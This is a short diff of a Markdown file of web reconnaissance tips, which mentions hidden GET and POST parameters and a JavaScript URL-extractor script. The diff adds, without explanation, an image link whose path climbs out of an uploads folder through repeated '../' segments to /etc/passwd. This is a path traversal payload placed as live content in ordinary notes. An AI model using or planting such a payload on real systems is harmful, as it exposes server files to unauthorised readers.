@@ -34,3 +34,7 @@ Finding hidden GET & POST parameters
 -------------------------------------------
 This python script is really cool and tries to extract URLs endpoints stored in JS scripts. It works well and has helped me many times!
 * https://github.com/jobertabma/relative-url-extractor
+
+---------------------------------------
+
+![a](/uploads/11111111111111111111111111111111/../../../../../../../../../../../../../../etc/passwd)
